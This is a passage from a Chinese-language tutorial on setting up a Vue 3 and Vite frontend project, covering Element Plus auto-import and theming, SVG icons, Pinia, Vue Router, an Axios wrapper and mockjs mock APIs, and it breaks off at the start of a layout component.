<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-comment">// https://vite.dev/config/</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title class_">AutoImport</span>({
      <span class="hljs-comment">// 自动导入 vue 相关函数，如：ref, reactive, toRef 等</span>
      <span class="hljs-comment">// imports: ['vue'], // 我是说如果，对 Vue3 还不熟，建议注释该行，手动导入 vue 相关函数</span>
      <span class="hljs-attr">resolvers</span>: [
        <span class="hljs-comment">// 自动导入 Element Plus 相关函数，如：ElMessage, ElNotification 等</span>
        <span class="hljs-title class_">ElementPlusResolver</span>(),
        <span class="hljs-comment">// 自动导入图标组件</span>
        <span class="hljs-title class_">IconsResolver</span>(),
      ],
      <span class="hljs-attr">eslintrc</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> }, <span class="hljs-comment">// 生成 .eslintrc-auto-import.json，eslint 不报错</span>
    }),
    <span class="hljs-title class_">Components</span>({
      <span class="hljs-attr">resolvers</span>: [
        <span class="hljs-comment">// 自动注册 Element Plus 组件</span>
        <span class="hljs-title class_">ElementPlusResolver</span>(),
        <span class="hljs-comment">// 自动注册图标组件</span>
        <span class="hljs-title class_">IconsResolver</span>({
          <span class="hljs-attr">enabledCollections</span>: [<span class="hljs-string">'ep'</span>], <span class="hljs-comment">// element-plus 图标库</span>
        }),
      ],
    }),
    <span class="hljs-title class_">Icons</span>({
      <span class="hljs-comment">// 自动安装图标库</span>
      <span class="hljs-attr">autoInstall</span>: <span class="hljs-literal">true</span>,
    }),
  ],
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">'@'</span>: <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'./src'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>)),
    },
  },
})
</code></pre>
<p>实际使用示例：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- Components 插件处理这些组件的自动注册 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"showMessage"</span>&gt;</span>click me<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
  
  <span class="hljs-comment">&lt;!-- 图标组件 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-search</span> /&gt;</span>
  
  <span class="hljs-comment">&lt;!-- 图标按钮 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-CirclePlus</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"el-icon--left"</span> /&gt;</span>click me<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">showMessage</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// AutoImport 插件处理这些 API 的自动导入</span>
  <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'操作成功！'</span>);
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">主题配置</h3>
<p>新建 <code>src/styles/theme.scss</code>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/* Element Plus Theme Overrides */</span>
<span class="hljs-comment">/* https://element-plus.org/en-US/guide/theme.html#how-to-override-it */</span>
<span class="hljs-keyword">@forward</span> <span class="hljs-string">'element-plus/theme-chalk/src/common/var.scss'</span> with (
  <span class="hljs-variable">$colors</span>: (
    <span class="hljs-string">'primary'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#165dff</span>,
    ),
    <span class="hljs-string">'success'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#009298</span>,
    ),
    <span class="hljs-string">'warning'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#e6a23c</span>,
    ),
    <span class="hljs-string">'danger'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#ff2664</span>,
    ),
    <span class="hljs-string">'error'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#ff2664</span>,
    ),
    <span class="hljs-string">'info'</span>: (
      <span class="hljs-string">'base'</span>: <span class="hljs-number">#909399</span>,
    ),
  )
);
</code></pre>
<p>配置 <code>vite.config.js</code>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">AutoImport</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-auto-import/vite'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElementPlusResolver</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-vue-components/resolvers'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Components</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'unplugin-vue-components/vite'</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{ mode }</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">plugins</span>: [
      <span class="hljs-title class_">AutoImport</span>({
        <span class="hljs-attr">resolvers</span>: [
          <span class="hljs-title class_">ElementPlusResolver</span>({
            <span class="hljs-attr">importStyle</span>: <span class="hljs-string">'sass'</span>, <span class="hljs-comment">// 核心作用是告诉 Vite 自动导入 Element Plus 组件的 SCSS 源码，而不是编译好的 CSS 文件，这是自定义主题生效的关键。如果不写（默认）：插件会自动导入组件对应的预编译 .css 文件。这些 CSS 是已经打包死的（例如主色定死了是 #409eff），在项目中定义的 SCSS 变量无法渗透进去，主题配置会失效</span>
          }),
        ],
      }),
      <span class="hljs-title class_">Components</span>({
        <span class="hljs-attr">resolvers</span>: [
          <span class="hljs-comment">// 自动注册 Element Plus 组件</span>
          <span class="hljs-title class_">ElementPlusResolver</span>({
            <span class="hljs-attr">importStyle</span>: <span class="hljs-string">'sass'</span>,
          }),
        ],
      }),
    ],
    <span class="hljs-attr">css</span>: {
      <span class="hljs-attr">preprocessorOptions</span>: {
        <span class="hljs-attr">scss</span>: {
          <span class="hljs-attr">additionalData</span>: <span class="hljs-string">`@use "@/styles/theme.scss" as *;`</span>,
        },
      },
    },
  }
})
</code></pre>
<h3 data-id="heading-8">本地图标</h3>
<p>前面说了如何使用 ElementPlus （第三方）的图标，如果要使用本地 svg 图标，需要安装插件：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D vite-plugin-svg-icons
</code></pre>
<p>此插件核心作用：</p>
<ol>
<li><strong>自动扫描目录</strong> → 递归读取 <code>src/assets/icons/*.svg</code></li>
<li><strong>生成 SVG 雪碧图</strong> → 打包成 <strong>单个 .js</strong> 文件，<strong>减少 HTTP 请求</strong></li>
<li><strong>组件化调用</strong> → 通过 <code>&lt;svg&gt;&lt;use href="#icon-name"&gt;&lt;/use&gt;&lt;/svg&gt;</code> 引用，<strong>零配置</strong></li>
<li><strong>按需加载</strong> → <strong>只打包使用的图标</strong>，<strong>体积↓30%+</strong></li>
<li><strong>热更新</strong> → <strong>修改 SVG → 页面实时刷新</strong></li>
<li><strong>样式继承</strong> → <strong>CSS 改颜色/大小</strong>，<strong>无 DOM 操作</strong></li>
</ol>
<p>如果会报错提示缺失 <code>fast-glob</code> 依赖，安装一下：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D fast-glob
</code></pre>
<p><code>vite.config.js</code> 中配置：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { fileURLToPath, <span class="hljs-variable constant_">URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:url'</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { createSvgIconsPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-svg-icons'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// ...</span>
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">createSvgIconsPlugin</span>({
      <span class="hljs-attr">iconDirs</span>: [<span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'./src/assets/icons'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>))],
      <span class="hljs-attr">symbolId</span>: <span class="hljs-string">'icon-[dir]-[name]'</span>,
    }),
  ],
})
</code></pre>
<p>准备图标：</p>
<pre><code class="hljs language-arduino" lang="arduino">src/assets/icons/          ← 放所有 .svg
├─ home.svg
├─ user.svg
└─ logo.svg
</code></pre>
<p>新建 <code>src/components/SvgIcon.vue</code>：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>({
  <span class="hljs-attr">name</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
    <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>,
  },
  <span class="hljs-attr">prefix</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-string">'icon'</span>,
  },
  <span class="hljs-attr">className</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-string">''</span>,
  },
})

<span class="hljs-keyword">const</span> symbolId = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-string">`#<span class="hljs-subst">${props.prefix}</span>-<span class="hljs-subst">${props.name}</span>`</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"className"</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">"true"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">use</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">"symbolId"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
svg {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">1em</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">1em</span>;
  <span class="hljs-attribute">vertical-align</span>: -<span class="hljs-number">0.15em</span>; <span class="hljs-comment">/* 因 icon 大小被设置为和字体大小一致，而 span 等标签的下边缘会和字体的基线对齐，故需设置一个往下的偏移比例，来纠正视觉上的未对齐效果 */</span>
  fill: currentcolor; <span class="hljs-comment">/* 支持外部 color/font-size 控制 */</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><code>main.js</code> 引入：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">'virtual:svg-icons-register'</span> <span class="hljs-comment">// vite-plugin-svg-icons 插件注册，生成雪碧图并注入 DOM，不引入会导致 svg 图标无法正常显示</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">SvgIcon</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/SvgIcon.vue'</span>

app.<span class="hljs-title function_">component</span>(<span class="hljs-string">'SvgIcon'</span>, <span class="hljs-title class_">SvgIcon</span>)
</code></pre>
<p>使用：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">SvgIcon</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"home"</span> /&gt;</span>
</code></pre>
<h3 data-id="heading-9">Pinia</h3>
<p>安装：</p>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">add</span> pinia
</code></pre>
<p>可以把 pinia 看作船新版本的 vuex，使用 composition API，类比一下，新建 <code>src/store/modules/index.js</code>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'counter'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// ref -&gt; state</span>
  <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)

  <span class="hljs-comment">// computed -&gt; getters</span>
  <span class="hljs-keyword">const</span> double = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> count.<span class="hljs-property">value</span> * <span class="hljs-number">2</span>
  })

  <span class="hljs-comment">// function -&gt; actions</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
    count.<span class="hljs-property">value</span>++
  }

  <span class="hljs-keyword">return</span> { count, double, increment }
})
</code></pre>
<p>导出创建的 store 模块，新建  <code>src/store/index.js</code>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./modules/counter'</span>
</code></pre>
<p>main.js 中引入：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createPinia } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>

app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">createPinia</span>())

app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<p>实际使用案例：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- src/App.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useCounterStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">const</span> counterStore = <span class="hljs-title function_">useCounterStore</span>()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"counterStore.increment"</span>&gt;</span>爸爸点我<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">HelloWorld</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-comment">&lt;!-- src/components/HelloWorld.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useCounterStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">const</span> counterStore = <span class="hljs-title function_">useCounterStore</span>()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>我被点了：{{ counterStore.count }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>加倍：{{ counterStore.double }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">Vue Router</h3>
<p>安装：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add vue-router
</code></pre>
<p>新建 <code>src/router/index.js</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createRouter, createWebHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-comment">// 导入布局组件 (后续创建)</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Layout</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/layout/index.vue'</span> 

<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Layout</span>,
    <span class="hljs-attr">redirect</span>: <span class="hljs-string">'/dashboard'</span>,
    <span class="hljs-attr">children</span>: [
      {
        <span class="hljs-attr">path</span>: <span class="hljs-string">'dashboard'</span>,
        <span class="hljs-attr">name</span>: <span class="hljs-string">'Dashboard'</span>,
        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/views/dashboard/index.vue'</span>), <span class="hljs-comment">// 自行创建</span>
        <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'首页'</span> }
      }
    ]
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Login'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/views/login/index.vue'</span>), <span class="hljs-comment">// 自行创建</span>
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'登录'</span> }
  }
]

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(),
  routes
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<p>在 <code>src/main.js</code> 中注册路由：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
app.<span class="hljs-title function_">use</span>(router)
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h3 data-id="heading-11">Axios</h3>
<p>安装：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add axios
</code></pre>
<p>新建 <code>src/utils/request.js</code>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>

<span class="hljs-keyword">const</span> service = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,
})

<span class="hljs-comment">// 请求拦截器</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()
    <span class="hljs-keyword">if</span> (userStore.<span class="hljs-property">token</span>) {
      config.<span class="hljs-property">headers</span>.<span class="hljs-property">token</span> = userStore.<span class="hljs-property">token</span>
    }
    <span class="hljs-keyword">return</span> config
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
  }
)

<span class="hljs-comment">// 响应拦截器</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> { code, message } = response.<span class="hljs-property">data</span>
    <span class="hljs-keyword">if</span> (code === <span class="hljs-number">200</span>) {
      <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
    }

    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(message || <span class="hljs-string">'Error'</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(message || <span class="hljs-string">'Error'</span>))
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">response</span>.<span class="hljs-property">data</span>) {
      <span class="hljs-keyword">const</span> { code, message } = error.<span class="hljs-property">response</span>.<span class="hljs-property">data</span>
      <span class="hljs-keyword">if</span> (code === <span class="hljs-number">500</span>) {
        <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">'当前页面已失效，请重新登录'</span>, <span class="hljs-string">'提示'</span>, {
          <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">'确定'</span>,
          <span class="hljs-attr">type</span>: <span class="hljs-string">'warning'</span>,
        }).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>()
          <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'/'</span>
        })
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(message || <span class="hljs-string">'Error'</span>)
      }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error.<span class="hljs-property">message</span>)
  }
)

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> service
</code></pre>
<blockquote>
<p>需要根据后端实际返回格式调整相应部分代码</p>
</blockquote>
<p>新建 <code>src/api/user.js</code> ，待会 mock 数据后模拟请求：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> request <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/request'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = (<span class="hljs-params">data</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/user/login'</span>,
    <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>,
    data,
  })
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getUserInfo</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/user/info'</span>,
    <span class="hljs-attr">method</span>: <span class="hljs-string">'get'</span>,
  })
}
</code></pre>
<h3 data-id="heading-12">Mock 数据</h3>
<p>安装：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D vite-plugin-mock mockjs
</code></pre>
<p><code>vite.config.js</code> 中：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { viteMockServe } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-mock'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{ mode }</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">plugins</span>: [
      <span class="hljs-comment">// ...</span>
      <span class="hljs-title function_">viteMockServe</span>({
        <span class="hljs-attr">mockPath</span>: <span class="hljs-string">'mock'</span>,
        <span class="hljs-attr">enable</span>: mode === <span class="hljs-string">'development'</span>,
      }),
    ],
  }
})
</code></pre>
<p>项目根目录下新建 <code>mock/user.js</code>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> mockjs <span class="hljs-keyword">from</span> <span class="hljs-string">'mockjs'</span>

<span class="hljs-keyword">const</span> userList = mockjs.<span class="hljs-title function_">mock</span>({
  <span class="hljs-comment">// 属性 list 的值是一个数组，其中含有 1 到 10 个元素</span>
  <span class="hljs-string">'list|1-10'</span>: [
    {
      <span class="hljs-comment">// 随机生成id号</span>
      <span class="hljs-attr">id</span>: <span class="hljs-string">'@id'</span>,
      <span class="hljs-comment">// 随机生成中文姓名</span>
      <span class="hljs-attr">name</span>: <span class="hljs-string">'@cname'</span>,
      <span class="hljs-comment">// 属性 id 是一个自增数，起始值为 1，每次增 1</span>
      <span class="hljs-string">'id|+1'</span>: <span class="hljs-number">1</span>,
      <span class="hljs-comment">// 随机生成ip地址</span>
      <span class="hljs-attr">ip</span>: <span class="hljs-string">'@ip'</span>,
      <span class="hljs-comment">// 随机生成省市区地址</span>
      <span class="hljs-attr">address</span>: <span class="hljs-string">'@county(true)'</span>,
      <span class="hljs-comment">// 随机生成邮政编码</span>
      <span class="hljs-attr">zip</span>: <span class="hljs-string">'@zip'</span>,
      <span class="hljs-comment">// 随机生成18-70之间的年龄</span>
      <span class="hljs-string">'age|18-70'</span>: <span class="hljs-number">20</span>,
      <span class="hljs-comment">// 随机生成日期</span>
      <span class="hljs-attr">date</span>: <span class="hljs-string">'@date("yyyy-MM-dd")'</span>,
      <span class="hljs-comment">// 随机生成头像</span>
      <span class="hljs-attr">avatar</span>: <span class="hljs-string">"@image('')"</span>,
    },
  ],
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> [
  {
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/user/list'</span>,
    <span class="hljs-attr">method</span>: <span class="hljs-string">'get'</span>,
    <span class="hljs-attr">response</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>,
        <span class="hljs-attr">data</span>: userList,
      }
    },
  },
]
</code></pre>
<p>执行 <code>pnpm dev</code>，<code>vite-plugin-mock</code> 会根据你提供的 mock 数据自动代理接口。此时，你就可以在前端代码中正常请求 <code>/api/user</code>，并且获取到模拟的响应数据，使用示例：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { getUserList } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/user'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">getData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUserList</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)
}

<span class="hljs-title function_">getData</span>()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c004ebf01f3a40058b17722404b8040e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5oyW5Zyf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461042&amp;x-signature=33L%2BUbBRycUhM10K9ihGCz41bWw%3D" alt="userlist.png" loading="lazy"/></p>
<h3 data-id="heading-13">搭建基础布局 (Layout)</h3>
<p>准备用 AI 写个简单布局页面，新建 <code>src/layout/index.vue</code>：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
